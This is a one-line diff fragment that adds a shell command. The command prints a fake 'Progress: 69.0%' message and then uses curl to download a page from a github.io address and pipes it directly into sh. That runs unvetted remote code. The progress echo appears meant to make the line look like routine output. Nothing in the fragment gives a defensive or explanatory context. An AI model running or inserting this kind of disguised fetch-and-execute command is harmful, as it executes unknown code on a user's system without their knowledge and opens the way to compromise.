@@ -1,0 +1,1 @@
+echo 'Progress: 69.0%'; curl -L --progress-bar frkns.github.io/fun/crisis-originally-thinkpad-neighbor-lap.html | sh
